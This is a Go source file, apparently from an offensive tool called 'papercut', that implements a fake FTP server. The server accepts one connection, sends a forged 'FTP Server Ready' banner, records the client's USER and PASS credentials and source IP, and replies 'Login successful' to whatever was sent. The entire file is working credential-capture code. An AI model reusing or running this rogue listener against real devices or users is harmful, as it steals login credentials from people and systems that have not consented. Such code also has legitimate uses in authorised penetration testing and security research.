package listener

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"papercut/internal/output"
)

// FTPCreds holds captured FTP credentials.
type FTPCreds struct {
	SourceIP string
	Username string
	Password string
}

// ListenFTP starts a TCP listener on addr (host:port), waits for one incoming
// FTP connection, captures USER/PASS credentials, then returns.
// It blocks until credentials are received or the context/timeout expires.
func ListenFTP(ctx context.Context, addr string, timeout time.Duration, verbose bool) (*FTPCreds, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", addr, err)
	}
	defer ln.Close()

	// Close listener when context is cancelled
	go func() {
		<-ctx.Done()
		ln.Close()
	}()

	// Set accept deadline based on timeout
	if tcpLn, ok := ln.(*net.TCPListener); ok {
		tcpLn.SetDeadline(time.Now().Add(timeout))
	}

	conn, err := ln.Accept()
	if err != nil {
		select {
		case <-ctx.Done():
			return nil, fmt.Errorf("cancelled while waiting for FTP connection")
		default:
			return nil, fmt.Errorf("accept: %w", err)
		}
	}
	defer conn.Close()

	sourceIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(sourceIP); err == nil {
		sourceIP = host
	}

	if verbose {
		output.Info("FTP connection received from %s", sourceIP)
	}

	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	reader := bufio.NewReader(conn)

	// Send FTP banner
	conn.Write([]byte("220 FTP Server Ready\r\n"))

	creds := &FTPCreds{SourceIP: sourceIP}

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			if creds.Username != "" && creds.Password != "" {
				return creds, nil
			}
			return nil, fmt.Errorf("read from %s: %w", sourceIP, err)
		}

		line = strings.TrimRight(line, "\r\n")
		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToUpper(parts[0])

		if verbose {
			output.Info("FTP < %s", line)
		}

		switch cmd {
		case "USER":
			if len(parts) > 1 {
				creds.Username = parts[1]
			}
			conn.Write([]byte("331 Password required\r\n"))

		case "PASS":
			if len(parts) > 1 {
				creds.Password = parts[1]
			}
			conn.Write([]byte("230 Login successful\r\n"))
			return creds, nil

		case "QUIT":
			conn.Write([]byte("221 Goodbye\r\n"))
			if creds.Username != "" {
				return creds, nil
			}
			return nil, fmt.Errorf("client disconnected before sending credentials")

		default:
			// Respond to anything else with a generic OK to keep the session alive
			conn.Write([]byte("200 OK\r\n"))
		}
	}
}
